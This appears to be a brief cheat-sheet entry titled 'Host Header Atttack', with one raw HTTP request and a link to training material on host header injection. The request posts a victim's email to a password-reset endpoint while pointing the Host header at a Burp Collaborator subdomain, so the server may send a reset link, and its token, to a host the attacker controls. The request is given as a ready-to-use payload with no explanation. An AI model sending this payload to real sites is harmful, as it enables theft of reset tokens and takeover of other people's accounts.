# Host Header Atttack
```http
POST /member/getpassword HTTP/1.1
Host: SUBDOMAIN.burpcollaborator.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.3
Content-Type: application/x-www-form-urlencoded

email=alice@livemail.com
```

https://application.security/free-application-security-training/owasp-top-10-host-header-injection
